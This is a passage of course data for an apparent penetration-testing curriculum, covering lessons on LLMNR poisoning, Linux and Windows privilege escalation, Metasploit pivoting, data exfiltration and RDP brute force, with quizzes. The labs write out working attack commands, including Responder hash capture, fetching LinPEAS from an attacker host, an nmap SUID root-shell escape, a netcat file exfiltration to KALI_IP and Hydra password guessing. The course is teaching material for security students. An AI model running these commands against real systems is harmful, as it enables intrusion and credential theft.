                    "Wireshark is the world's most popular network protocol analyzer, used for troubleshooting, analysis, and security auditing.",
                },
                {
                  id: 3,
                  question:
                    "In the context of web browsing, what is session hijacking?",
                  options: [
                    "Guessing a user's password.",
                    "Stealing a user's session cookie to impersonate them and access their account.",
                    "Redirecting a user to a fake website.",
                    "Forcing a user's session to log out.",
                  ],
                  correct: 1,
                  explanation:
                    "Session hijacking bypasses the need for a password by stealing the authentication token (the cookie) that is used after a user has already logged in.",
                },
              ],
            },
          },
          {
            id: "lesson-11",
            title: "Exploiting Network Protocols",
            duration: "75 min",
            objectives: [
              "Explain how LLMNR and NBT-NS work",
              "Describe the name resolution poisoning vulnerability",
              "Use the Responder tool to capture password hashes",
              "Understand the importance of disabling legacy protocols",
            ],
            content: {
              overview:
                "Deep within Windows networks lie legacy name resolution protocols that can be a goldmine for an attacker. This lesson focuses on exploiting LLMNR and NetBIOS, two protocols that Windows falls back to when DNS fails. By poisoning the responses, an attacker can trick clients into sending valuable NTLMv2 password hashes over the network, which can then be captured and cracked offline.",
              sections: [
                {
                  title: "The Windows Name Resolution Fallback",
                  content:
                    "<p>When a Windows user tries to access a network share, for example by typing `\\\\fileserver` in File Explorer, the OS tries to find the IP address for 'fileserver'. It first checks its local hosts file, then it queries a DNS server. But what if the DNS server doesn't know the answer, or if the user mistypes the name (e.g., `\\\\fileservr`)? On internal networks, Windows will 'fall back' and use two legacy protocols:</p><ul><li><strong>LLMNR (Link-Local Multicast Name Resolution):</strong> The client will shout out to the entire local network, 'Who is `fileservr`?'</li><li><strong>NBT-NS (NetBIOS Name Service):</strong> If LLMNR fails, it will do the same thing again using the even older NetBIOS protocol.</li></ul><p>These protocols are unauthenticated and operate on trust. Anyone on the local network can reply to these queries.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542382257-80ded13c79c8?w=800&h=400&fit-crop",
                },
                {
                  title: "Poisoning and Hash Capture with Responder",
                  content:
                    "<p>An attacker can abuse this fallback behavior. They run a tool that listens for these LLMNR and NBT-NS queries. When the tool sees a query, it immediately responds to the victim, 'Yes, I am `fileservr`! My IP address is [Attacker's IP].'</p><p>The victim's machine, believing it has found the server, will then try to authenticate to the attacker's machine to access the share. It does this by sending the user's NTLMv2 hash, which is a challenge-response authentication mechanism. The attacker's tool captures this hash. It cannot be used directly for a 'Pass-the-Hash' attack, but it has been captured and can now be taken offline for cracking.</p><h3>Responder: The All-in-One Tool</h3><p><strong>Responder</strong> is a powerful tool included in Kali Linux that automates this entire attack. It listens for LLMNR, NBT-NS, and MDNS queries, poisons the responses, and includes built-in rogue servers (SMB, HTTP, etc.) to capture the incoming authentication attempts and save the hashes to a file.</p>",
                  image: "https://i.imgur.com/8QnU42j.png",
                },
                {
                  title: "Cracking the Hashes",
                  content:
                    "<p>Once an NTLMv2 hash is captured by Responder, it can be cracked using offline password cracking tools like <strong>Hashcat</strong> or <strong>John the Ripper</strong>. The attacker uses their own powerful GPUs and large wordlists to try and find the original plaintext password that corresponds to the captured hash. Because this is done offline, it can be performed very quickly and without any risk of detection by the target network. Finding even one user password can be the key to accessing the entire network.</p>",
                  image:
                    "https://images.unsplash.com/photo-1526374965328-5f61d25c0e40?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Perform LLMNR Poisoning with Responder",
                  language: "bash",
                  code: "# This lab requires a Windows VM on the same network as your Kali machine.\n\n# Step 1: Launch Responder on your Kali machine.\n# The `-I` flag specifies which network interface to listen on (e.g., eth0).\n# `-v` enables verbose mode to see the events as they happen.\nsudo responder -I eth0 -v\n\n# Responder is now listening. It has turned off its poisoning servers initially.\n\n# Step 2: Trigger the Attack from the Windows VM.\n# - Open File Explorer on your Windows machine.\n# - In the address bar, type in the name of a non-existent server, for example: `\\\\thissharedoesnotexist`\n# - Press Enter.\n\n# Step 3: Observe Responder's Output.\n# - As soon as you press Enter on Windows, you will see a flurry of activity in your Responder terminal.\n# - It will show that it detected an LLMNR or NBT-NS query for 'thissharedoesnotexist'.\n# - It will show that it sent a poisoned response, pointing the Windows victim to your Kali IP.\n# - Immediately after, it will show that its rogue SMB server received a connection attempt from the Windows machine and has captured the NTLMv2 hash for the logged-in Windows user.\n\n# The captured hash will be displayed on screen and saved to a log file in `/usr/share/responder/logs/`.\n\n# Step 4: (Optional) Crack the Hash with John the Ripper.\n# - Copy the full hash from Responder's output into a text file, e.g., `hash.txt`.\n# - Use a password cracking tool like John the Ripper with a wordlist.\n# `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`\n# If the user's password is in the wordlist, John will find and display it.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question: "LLMNR and NBT-NS are what kind of protocols?",
                  options: [
                    "Secure encryption protocols.",
                    "Legacy name resolution protocols used as a fallback to DNS on Windows networks.",
                    "Web server protocols.",
                    "Database access protocols.",
                  ],
                  correct: 1,
                  explanation:
                    "These are insecure, legacy protocols that Windows uses to find hosts on a local network when DNS fails. Their trust-based nature makes them easy to exploit.",
                },
                {
                  id: 2,
                  question:
                    "What is the primary goal of an attacker running the Responder tool?",
                  options: [
                    "To perform a denial-of-service attack.",
                    "To sniff Wi-Fi traffic.",
                    "To poison LLMNR/NBT-NS responses to trick clients into sending their password hashes to the attacker.",
                    "To scan for open ports.",
                  ],
                  correct: 2,
                  explanation:
                    "Responder is a specialized tool for name resolution poisoning with the express purpose of capturing password hashes from clients.",
                },
                {
                  id: 3,
                  question:
                    "After capturing an NTLMv2 hash with Responder, what is the next step?",
                  options: [
                    "Use it in a Pass-the-Hash attack.",
                    "Attempt to crack the hash offline using a tool like Hashcat or John the Ripper to find the plaintext password.",
                    "Submit it to the target's login page.",
                    "Delete the hash to cover your tracks.",
                  ],
                  correct: 1,
                  explanation:
                    "NTLMv2 hashes are challenge-response hashes and cannot be directly replayed. They must be taken offline and cracked with powerful hardware against wordlists to recover the original password.",
                },
              ],
            },
          },
          {
            id: "lesson-12",
            title: "Privilege Escalation",
            duration: "90 min",
            objectives: [
              "Define privilege escalation and differentiate between horizontal and vertical escalation",
              "Identify common vectors for privilege escalation in Linux (sudo, SUID)",
              "Identify common vectors for privilege escalation in Windows (unquoted service paths, stored credentials)",
              "Use automated scripts to find escalation paths",
            ],
            content: {
              overview:
                "Gaining initial access to a machine is only the beginning. Often, your first shell will be as a low-privileged user. The critical next step is Privilege Escalation, or 'privesc': the process of exploiting a bug, design flaw, or misconfiguration to gain elevated access, most commonly to become the 'root' user in Linux or 'NT AUTHORITY\\SYSTEM' in Windows. This lesson covers the fundamental techniques for finding and exploiting these flaws.",
              sections: [
                {
                  title: "The Goal: From User to Root/SYSTEM",
                  content:
                    "<p>Privilege escalation is about increasing your level of control. There are two types:</p><ul><li><strong>Vertical Privilege Escalation:</strong> This is the classic model. You move upwards, from a low-privilege account (like `www-data` or a standard user) to a high-privilege account (like `root` or `SYSTEM`).</li><li><strong>Horizontal Privilege Escalation:</strong> This involves gaining access to the account of another user who has the same level of permissions as you. This is often done to access that user's specific files or data.</li></ul><p>Our primary focus in this lesson is on vertical escalation, as gaining full administrative control of a machine is a key goal in any penetration test.</p>",
                  image:
                    "https://images.unsplash.com/photo-1594402633342-a08b3c31fad1?w=800&h=400&fit=crop",
                },
                {
                  title: "Linux Privilege Escalation Vectors",
                  content:
                    "<p>Linux offers many potential paths to root.</p><ul><li><strong>Kernel Exploits:</strong> The ideal but less common method. An exploit for a vulnerability in the operating system's kernel can often lead directly to root. This requires finding the exact kernel version and searching for a matching public exploit.</li><li><strong>Sudo Misconfigurations:</strong> The `sudo` command allows users to run commands as root. If the sudoers file (`/etc/sudoers`) is misconfigured to allow a user to run a command they can abuse (like `find`, `nmap`, or even `less`), they can use it to spawn a root shell.</li><li><strong>SUID Binaries:</strong> A SUID bit on an executable file means it will run with the permissions of the file owner, not the user who executed it. If a custom program owned by root has a SUID bit and a vulnerability (like a buffer overflow), it can be exploited to run code as root.</li><li><strong>Weak File Permissions:</strong> If a sensitive file or directory is world-writable, it can be abused. For example, if `/etc/passwd` is writable, you can add your own root user. If a directory in root's `PATH` is writable, you could place a malicious script there.</li><li><strong>Cron Jobs:</strong> If a scheduled task (cron job) running as root uses a script that is writable by a lower-privileged user, that user can modify the script to execute their own commands as root.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1629834465737-f1c52b34a6c3?w=800&h=400&fit=crop",
                },
                {
                  title: "Windows Privilege Escalation Vectors",
                  content:
                    "<p>Windows has its own set of common misconfigurations.</p><ul><li><strong>Unquoted Service Paths:</strong> If the path to a service executable is not enclosed in quotation marks and contains a space (e.g., `C:\\Program Files\\My Service\\service.exe`), Windows can be tricked into executing a malicious file named `C:\\Program.exe` with SYSTEM privileges.</li><li><strong>Stored Credentials:</strong> Windows sometimes stores credentials in memory (LSASS), the registry, or configuration files. Tools like Mimikatz can be used to extract plaintext passwords and hashes.</li><li><strong>AlwaysInstallElevated:</strong> A Group Policy setting that allows low-privilege users to install `.msi` packages with SYSTEM privileges. An attacker can craft a malicious `.msi` package to get a SYSTEM shell.</li><li><strong>Insecure Service Permissions:</strong> If a user has permissions to modify or restart a Windows service that runs as SYSTEM, they can replace the service's executable with their own payload and restart it to gain elevated access.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1593495147558-c1143a5390a8?w=800&h=400&fit=crop",
                },
              ],
            },
            codeExamples: [
              {
                title: "Lab: Escalate Privileges in a Linux VM",
                language: "bash",
                code: "# This lab assumes you have a user shell on a Linux machine (e.g., msfadmin on Metasploitable 2).\n# Manual enumeration is key, but we can use scripts to speed it up.\n\n# Step 1: Use an automated enumeration script.\n# Tools like `LinPEAS` (Linux Privilege Escalation Awesome Script) will run hundreds of checks and highlight potential vulnerabilities in color.\n# From your Kali machine, start a web server in the directory where you have the LinPEAS script (`linpeas.sh`).\n`python3 -m http.server 80`\n\n# Step 2: Download and Run LinPEAS on the target.\n# From your shell on the target machine:\n`cd /tmp`\n`wget http://KALI_IP/linpeas.sh`\n`chmod +x linpeas.sh`\n`./linpeas.sh`\n\n# Step 3: Analyze the output.\n# - LinPEAS will produce a huge amount of output. Look for the items highlighted in red and yellow.\n# - It checks for the kernel version, sudo permissions, SUID files, writable files, cron jobs, and much more.\n\n# Step 4: Exploit a SUID Binary.\n# - LinPEAS will find that on Metasploitable 2, 'nmap' has the SUID bit set.\n# - This is a misconfiguration, as older versions of Nmap had an 'interactive' mode that could be used to escape to a shell.\n# - On the target machine, run the following command:\n`nmap --interactive`\n\n# Step 5: Gain a Root Shell.\n# - Nmap will enter its interactive mode.\n# - Now, type `!sh` and press Enter.\n# - This executes a shell command from within the Nmap process.\n# - Because Nmap was running with root permissions (due to the SUID bit), the shell it spawns will also be root.\n# - Type `whoami` and `id` to confirm. You should now be the root user.",
              },
            ],
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary goal of vertical privilege escalation?",
                  options: [
                    "To gain access to another user's account with the same privilege level.",
                    "To move from a low-privilege user account to a high-privilege account like 'root' or 'SYSTEM'.",
                    "To steal a user's password.",
                    "To install new software on a machine.",
                  ],
                  correct: 1,
                  explanation:
                    "Vertical escalation is about moving up the privilege hierarchy to gain administrative control of a system.",
                },
                {
                  id: 2,
                  question: "What is a SUID binary in Linux?",
                  options: [
                    "A file that cannot be deleted.",
                    "An executable file that, when run, executes with the permissions of the file owner, not the user running it.",
                    "A system log file.",
                    "A type of shell script.",
                  ],
                  correct: 1,
                  explanation:
                    "SUID (Set User ID) is a permission bit. If a SUID binary is owned by root and is vulnerable, it can be a direct path to a root shell.",
                },
                {
                  id: 3,
                  question:
                    "The 'Unquoted Service Path' vulnerability is specific to which operating system?",
                  options: ["macOS", "Linux", "Android", "Windows"],
                  correct: 3,
                  explanation:
                    "This classic Windows vulnerability occurs when the file path for a service executable contains spaces and is not enclosed in quotes, potentially leading Windows to execute a malicious program.",
                },
              ],
            },
          },
          {
            id: "lesson-13",
            title: "Pivoting & Lateral Movement",
            duration: "90 min",
            objectives: [
              "Define pivoting and its importance in network penetration testing",
              "Understand the concept of using a compromised host as a foothold",
              "Use tools like ProxyChains to relay traffic through a compromised machine",
              "Explain different techniques for port forwarding and tunneling",
            ],
            content: {
              overview:
                "Real-world networks are not flat; they are segmented into different zones separated by firewalls. Gaining a shell on a public-facing web server is often just the first step. The real goal is to use that machine as a 'pivot point' to access and attack the internal, protected network. This lesson covers the crucial techniques of lateral movement and pivoting to navigate through a defended network.",
              sections: [
                {
                  title: "What is Pivoting?",
                  content:
                    "<p><strong>Pivoting</strong> is the technique of using a compromised host to attack other systems on a different network segment that are not directly accessible from the attacker's machine. The compromised machine acts as a foothold and a launchpad for further attacks.</p><p>For example, an attacker on the internet compromises a web server in a company's DMZ (Demilitarized Zone). This web server can also communicate with the internal corporate network, which is firewalled off from the internet. The attacker can then 'pivot' through the web server, relaying their attack traffic (like Nmap scans or exploits) through it to target the internal machines.</p>",
                  image: "https://i.imgur.com/bW3x75T.png",
                },
                {
                  title: "Lateral Movement",
                  content:
                    "<p><strong>Lateral movement</strong> is the set of techniques attackers use to progressively move through a network, seeking out key assets and data. After compromising an initial host (the 'beachhead'), an attacker will use that machine to discover and then compromise other workstations and servers within the same network segment. This often involves using credentials stolen from the first machine (e.g., with Pass-the-Hash) to authenticate to other systems. Pivoting is the technique used to move between network segments, while lateral movement often describes the process of spreading within a single segment.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542382257-80ded13c79c8?w=800&h=400&fit=crop",
                },
                {
                  title: "Tools and Techniques for Pivoting",
                  content:
                    "<ul><li><strong>ProxyChains:</strong> A powerful tool that allows you to force any TCP-based application (like Nmap, SSH, or Netcat) to run its traffic through a proxy. By setting up a SOCKS proxy on the compromised host, you can use ProxyChains on your attacker machine to make it seem as if your tools are running directly from the compromised host, giving you access to the internal network.</li><li><strong>Port Forwarding / Tunneling:</strong> This involves creating a tunnel that forwards traffic from a port on your attacker machine to a port on a target machine in the internal network, using the compromised host as the relay. Metasploit's Meterpreter has built-in port forwarding capabilities (`portfwd`). SSH is also an extremely powerful tool for creating flexible and secure tunnels. For example, you can forward a local port on your Kali box through a compromised SSH server to access an RDP port on an internal Windows machine.</li><li><strong>Metasploit Pivoting:</strong> Metasploit is designed with pivoting in mind. Once you have a Meterpreter session on a host, you can add a route within Metasploit's framework. This tells Metasploit that to reach a specific internal subnet, it should route all its traffic (scans, exploits, etc.) through that existing Meterpreter session. This is one of the most seamless ways to pivot.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1621640348395-502f04b2e811?w=800&h=400&fit=crop",
                },
              ],
            },
            codeExamples: [
              {
                title: "Lab: Pivot Through a Compromised Host with Metasploit",
                language: "bash",
                code: "# This lab requires two target VMs: one dual-homed (with two network cards) to act as our pivot point, and another on an isolated internal network.\n# For example, Metasploitable 2 could be our pivot (attacker -> M2), and a Windows VM could be on an internal network only accessible from M2 (M2 -> Win).\n\n# Step 1: Gain a Foothold.\n# - Use Metasploit to gain a Meterpreter session on the first target (Metasploitable 2).\n\n# Step 2: Discover the Internal Network.\n# - From the Meterpreter session, run post-exploitation discovery.\n`run autoroute -s 10.10.10.0/24` # Let's say this is the internal network\n`run post/multi/manage/autoroute` # Sets up the routing\n# OR in the meterpreter session\n`ipconfig` # To see the pivot's second network interface\n`run arp_scanner -r 10.10.10.0/24` # Scan the internal network for live hosts\n\n# Step 3: Set Up the Route in Metasploit.\n# - Now that you have a session on a machine in both networks, you can tell Metasploit how to reach the internal network.\n# - Background the current session (`background`)\n`route add 10.10.10.0 255.255.255.0 1` # (Assuming the session ID is 1)\n\n# Step 4: Scan and Exploit the Internal Target.\n# - You can now use Metasploit modules against the internal target, and the traffic will be automatically routed through your Meterpreter pivot.\n`use auxiliary/scanner/portscan/tcp`\n`set RHOSTS INTERNAL_WINDOWS_IP`\n`set SESSION 1` # IMPORTANT: Specify the pivot session.\n`run`\n\n# The port scan will now run 'through' your first compromised host.\n# You can then select an exploit for the internal machine, set the target IP, and Metasploit will handle the pivoting automatically. Gaining a second Meterpreter session on the internal machine confirms a successful pivot.",
              },
            ],
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question: "In penetration testing, what is 'pivoting'?",
                  options: [
                    "Cracking a user's password.",
                    "Using a compromised system to attack other systems on a different, inaccessible network segment.",
                    "Deleting log files to cover your tracks.",
                    "Writing the final report.",
                  ],
                  correct: 1,
                  explanation:
                    "Pivoting is the technique of using one compromised host as a relay or proxy to gain access to other networks, essentially using it as a stepping stone.",
                },
                {
                  id: 2,
                  question: "What is 'lateral movement'?",
                  options: [
                    "Escalating from a user to a root account.",
                    "Moving from one network segment to another.",
                    "The process of moving from one compromised host to another within the same network segment.",
                    "Exfiltrating data out of the network.",
                  ],
                  correct: 2,
                  explanation:
                    "Lateral movement describes the process of spreading across a network from a single point of compromise, often using stolen credentials.",
                },
                {
                  id: 3,
                  question:
                    "How does a tool like ProxyChains help an attacker?",
                  options: [
                    "It automatically finds vulnerabilities in a target.",
                    "It forces tools that don't natively support proxies (like Nmap) to send their traffic through a SOCKS proxy set up on a compromised host.",
                    "It cracks password hashes.",
                    "It is a type of firewall.",
                  ],
                  correct: 1,
                  explanation:
                    "ProxyChains is a 'proxy-fier' that hooks into other applications to redirect their network traffic through a specified proxy, making it invaluable for pivoting.",
                },
              ],
            },
          },
          {
            id: "lesson-14",
            title: "Exfiltration Techniques",
            duration: "75 min",
            objectives: [
              "Define data exfiltration and its objective",
              "Identify common protocols used for exfiltration (HTTP, DNS)",
              "Use standard file transfer tools to exfiltrate data",
              "Understand the concept of a covert channel",
            ],
            content: {
              overview:
                "You've gained access, escalated privileges, and moved laterally through the network. Now it's time to achieve the objective of many real-world attacks: stealing data. This lesson covers the techniques of data exfiltration—the unauthorized transfer of data from a computer network. We will explore both simple file transfers and more advanced, covert methods for sneaking data past security monitoring.",
              sections: [
                {
                  title: "The Goal: Getting Data Out",
                  content:
                    "<p>Data exfiltration is the final objective for many adversaries. The goal is to find valuable information—customer data, intellectual property, financial records, credentials—and transfer it from the compromised internal network to an external server controlled by the attacker. In a penetration test, this is simulated by exfiltrating a specific, benign 'trophy' file to prove that the attack path is viable.</p><p>A key challenge is bypassing network egress filtering. Many organizations have firewalls that block outbound connections on most ports, but almost always allow outbound traffic on port 80 (HTTP) and 53 (DNS), as these are required for normal business operations. Attackers leverage these open ports.</p>",
                  image:
                    "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop",
                },
                {
                  title: "Common Exfiltration Methods",
                  content:
                    "<ul><li><strong>Direct File Transfer:</strong> If outbound firewall rules are permissive, the easiest way to exfiltrate data is to use standard tools like FTP, SCP (Secure Copy, over SSH), or even Netcat to directly transfer a file to a server on the internet.</li><li><strong>HTTP/HTTPS Tunneling:</strong> Since port 80/443 is almost always open, attackers often wrap their data in what looks like normal web traffic. The data can be encoded and placed in POST requests, custom HTTP headers, or even the URL itself. This is harder to detect than a random FTP connection.</li><li><strong>DNS Tunneling:</strong> This is a very stealthy, low-and-slow technique. The attacker encodes the data into a series of DNS queries for subdomains of a domain they control (e.g., `[encoded_data_chunk_1].attacker.com`, `[encoded_data_chunk_2].attacker.com`). The queries travel from the victim's machine to the public DNS infrastructure and are eventually routed to the attacker's authoritative name server, which logs the queries and reassembles the data. This is very difficult to block without deep packet inspection.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1621640348395-502f04b2e811?w=800&h=400&fit=crop",
                },
                {
                  title: "Covert Channels",
                  content:
                    "<p>A covert channel is a communication method that uses a protocol or system in an unauthorized or unforeseen way to transfer data. DNS tunneling is a classic example. Other covert channels can involve hiding data in ICMP packets (like ping requests), or even manipulating the timing of network packets to encode bits of information. These methods are designed to be extremely difficult to detect by traditional network security monitoring tools.</p>",
                  image:
                    "https://images.unsplash.com/photo-1526374965328-5f61d25c0e40?w=800&h=400&fit-crop",
                },
              ],
            },
            codeExamples: [
              {
                title: "Lab: Exfiltrate Data with scp and Netcat",
                language: "bash",
                code: '# This lab assumes you have a shell on a compromised machine (e.g., Metasploitable 2) and want to transfer a file back to your Kali machine.\n\n# --- Create a Trophy File ---\n# On the target machine:\n`echo "This is the secret data" > /tmp/secret.txt`\n\n# --- Method 1: Using SCP (Secure Copy) ---\n# SCP uses SSH, so if you have SSH credentials, this is a secure and simple way to transfer files.\n# This command is run FROM your Kali machine TO the target to pull the file.\n`scp msfadmin@TARGET_IP:/tmp/secret.txt /home/kali/Desktop/`\n\n# Or, if you only have a shell on the target, you can PUSH the file from the target to Kali.\n# `scp /tmp/secret.txt kali@KALI_IP:/home/kali/Desktop/`\n# (This requires that your Kali machine is running an SSH server and you have credentials for it).\n\n# --- Method 2: Using Netcat (The Swiss Army Knife) ---\n# This method is unencrypted but very versatile.\n\n# Step 1: Set up a listener on your Kali machine.\n# This command tells netcat to listen (`-l`) for an incoming connection on port 9001 (`-p 9001`)\n# and to write whatever it receives to the file `stolen.txt`.\n`nc -lp 9001 > stolen.txt`\n\n# Step 2: Send the file from the compromised target machine.\n# This command tells netcat on the target to connect to your Kali IP on port 9001 and send the contents of `secret.txt`.\n`nc KALI_IP 9001 < /tmp/secret.txt`\n\n# The connection will be made, the file content will be sent, and then the connection will close.\n# On your Kali machine, check the contents of `stolen.txt` to confirm the exfiltration was successful.\n`cat stolen.txt`',
              },
            ],
          },
          {
            passingScore: 80,
            questions: [
              {
                id: 1,
                question: "What is data exfiltration?",
                options: [
                  "The process of gaining initial access to a network.",
                  "The unauthorized transfer of data from a compromised network to an attacker-controlled location.",
                  "The act of deleting log files.",
                  "The process of escalating privileges from user to root.",
                ],
                correct: 1,
                explanation:
                  "Exfiltration is the act of stealing data, which is the primary objective of many real-world cyberattacks.",
              },
              {
                id: 2,
                question:
                  "Why do attackers often use DNS tunneling for data exfiltration?",
                options: [
                  "It is the fastest method available.",
                  "It is extremely stealthy because outbound DNS traffic (port 53) is almost always allowed by firewalls and is difficult to monitor.",
                  "It automatically encrypts the data.",
                  "It does not require a compromised host.",
                ],
                correct: 1,
                explanation:
                  "DNS tunneling is a 'low and slow' method that abuses a fundamental network protocol, making it a very effective covert channel for bypassing firewall rules.",
              },
              {
                id: 3,
                question:
                  "Which command-line tool would be suitable for a simple, direct file transfer from a compromised Linux host back to an attacker's machine?",
                options: ["nmap", "ping", "scp (Secure Copy)", "whois"],
                correct: 2,
                explanation:
                  "scp is designed specifically for securely copying files over an SSH connection, making it an excellent and reliable tool for exfiltration if SSH access is available.",
              },
            ],
          },
          {
            id: "lesson-15",
            title: "Exploiting Remote Services (RDP, Telnet, VNC)",
            duration: "75 min",
            objectives: [
              "Identify the risks of exposing RDP, Telnet, and VNC to the internet",
              "Perform a brute-force attack against an RDP login",
              "Exploit unencrypted Telnet/VNC sessions for credential sniffing",
              "Understand common misconfigurations for these services",
            ],
            content: {
              overview:
                "Remote access services are essential for system administration but can be a wide-open door for attackers if not properly secured. This lesson focuses on exploiting common weaknesses in protocols like RDP, Telnet, and VNC, primarily through the use of password attacks and by taking advantage of their inherently insecure nature.",
              sections: [
                {
                  title: "RDP (Remote Desktop Protocol - Port 3389)",
                  content:
                    "<p>RDP is the standard for graphical remote access to Windows systems. When exposed to the internet, it becomes a massive target for attackers. The primary attack vectors are:</p><ul><li><strong>Brute-Forcing Weak Passwords:</strong> This is the most common attack. Attackers use automated tools to try millions of common passwords against usernames like 'Administrator'. This is why strong, unique passwords and Account Lockout Policy are critical.</li><li><strong>BlueKeep (CVE-2019-0708):</strong> A critical 'wormable' vulnerability in older versions of RDP that could allow for remote code execution without any authentication. This highlights the importance of patching.</li><li><strong>Credential Theft:</strong> If an attacker gains access, they can use post-exploitation tools like Mimikatz to dump credentials from memory to pivot to other systems.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1593495147558-c1143a5390a8?w=800&h=400&fit=crop",
                },
                {
                  title: "Telnet (Port 23)",
                  content:
                    "<p>Telnet is an obsolete and highly insecure remote command-line protocol. It has been almost entirely replaced by SSH. Its fatal flaw is that <strong>all communication, including usernames and passwords, is sent in cleartext</strong>. Anyone sniffing the network traffic (e.g., via a MITM attack) can simply read the credentials. There is almost no legitimate reason to use Telnet on a modern network. If it is found during a pentest, the recommendation is always to disable it and use SSH instead.</p>",
                  image:
                    "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop",
                },
                {
                  title: "VNC (Virtual Network Computing - Port 5900+)",
                  content:
                    "<p>VNC is a platform-independent system for graphical remote desktop sharing. Like Telnet, many older VNC implementations are insecure by default.</p><ul><li><strong>Weak Authentication:</strong> Many VNC servers use a simple, short password for authentication which is highly susceptible to brute-force attacks. Some may even be configured with no password at all.</li><li><strong>Unencrypted Sessions:</strong> By default, most VNC traffic, including keystrokes and screen updates, is sent unencrypted. This makes it vulnerable to sniffing. While modern versions of VNC offer encryption, it is often not enabled.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Crack an RDP Password with Hydra",
                  language: "bash",
                  code: "# This lab targets a Windows VM with RDP enabled and a weak password for a user.\n\n# Step 1: Verify RDP is open.\n# Use Nmap to confirm that port 3389 is open on your target Windows VM.\n`nmap -p 3389 TARGET_IP`\n\n# Step 2: Prepare for the Hydra attack.\n# You need a list of potential usernames and passwords.\n# For example, create `users.txt` containing 'Administrator' and `passwords.txt` with a small wordlist.\n\n# Step 3: Launch Hydra.\n# -L users.txt : Path to the username list.\n# -P passwords.txt : Path to the password list.\n# rdp://TARGET_IP : The target, specifying the protocol.\n# -V : Verbose mode to show attempts.\n# -f : Stop after finding the first valid credential.\n\nhydra -L users.txt -P passwords.txt rdp://TARGET_IP -V -f\n\n# Step 4: Analyze the output.\n# Hydra will attempt to log in with every combination of username and password from your lists.\n# If it succeeds, it will print the valid credential pair.\n\n# Step 5: Connect with the found credential.\n# Use a remote desktop client like `xfreerdp` on Kali to connect to the target using the credentials you discovered.\n`xfreerdp /v:TARGET_IP /u:USERNAME /p:PASSWORD`\n\n# You should now have a full graphical desktop session on the remote Windows machine.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary security flaw of the legacy Telnet protocol?",
                  options: [
                    "It is too slow.",
                    "It sends all data, including passwords, in cleartext.",
                    "It only works on Windows.",
                    "It uses very strong encryption.",
                  ],
                  correct: 1,
                  explanation:
                    "Telnet's lack of encryption makes it completely unsuitable for use on untrusted networks, as credentials can be easily sniffed.",
                },
                {
                  id: 2,
                  question:
                    "What is the most common attack vector against internet-exposed RDP servers?",
                  options: [
                    "Denial-of-service attacks.",
                    "DNS spoofing.",
                    "Automated brute-force attacks guessing weak passwords.",
                    "Session hijacking.",
                  ],
                  correct: 2,
                  explanation:
                    "Exposed RDP endpoints are constantly scanned and attacked by automated bots trying to guess common usernames and weak passwords.",
                },
                {
                  id: 3,
                  question:
                    "A vulnerability like BlueKeep (CVE-2019-0708) is particularly dangerous because it allows for what?",
                  options: [
                    "Remote Code Execution without authentication.",
                    "Password guessing.",
                    "Sniffing RDP traffic.",
                    "Creating new user accounts.",
                  ],
                  correct: 0,
                  explanation:
                    "Pre-authentication RCE vulnerabilities are the most critical type, as they allow an attacker to take full control of a system without needing any credentials.",
                },
              ],
            },
          },
          {
            id: "lesson-16",
            title: "Exploiting Databases",
            duration: "75 min",
            objectives: [
              "Identify common database misconfigurations",
              "Perform a dictionary attack against a MySQL login",
              "Understand the basics of SQL injection",
              "Use SQLmap to automate the exploitation of an SQL injection vulnerability",
            ],
            content: {
              overview:
                "Databases are the crown jewels of most organizations, holding the sensitive data that attackers are ultimately after. This lesson covers two main vectors for compromising databases: attacking the database service directly with weak credentials and exploiting web applications that use a database backend via SQL injection.",
              sections: [
                {
                  title: "Direct Database Attacks",
                  content:
                    "<p>Sometimes, databases are unintentionally exposed directly to the network. An Nmap scan might reveal that port 3306 (MySQL), 1433 (MSSQL), or 5432 (PostgreSQL) is open. In these cases, the attack path is often straightforward:</p><ul><li><strong>Default Credentials:</strong> Many databases are installed with default administrator credentials (e.g., user: `root`, password: `password` or blank). Attackers will always check for these.</li><li><strong>Weak Credentials:</strong> Even if the password isn't a default, it may be weak and susceptible to a dictionary attack using a tool like Hydra.</li><li><strong>Missing Patches:</strong> Database software, like any other software, has vulnerabilities. An exposed, unpatched database server might be vulnerable to an exploit that gives an attacker a shell on the underlying OS.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit-crop",
                },
                {
                  title: "SQL Injection (SQLi)",
                  content:
                    "<p>More commonly, databases are not directly exposed but are accessed via a web application. <strong>SQL Injection</strong> is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally occurs when an application takes user-supplied input (e.g., from a URL parameter or a form field) and includes it in an SQL statement without proper validation.</p><p>By injecting malicious SQL syntax, an attacker can trick the application into running their own queries. This can be used to:</p><ul><li>Bypass login forms.</li><li>Read sensitive data from the database that they are not supposed to see (e.g., all usernames and passwords).</li><li>Modify database data.</li><li>In some cases, even execute commands on the underlying operating system.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1599507578794-279213135e13?w=800&h=400&fit=crop",
                },
                {
                  title: "Automating SQLi with SQLmap",
                  content:
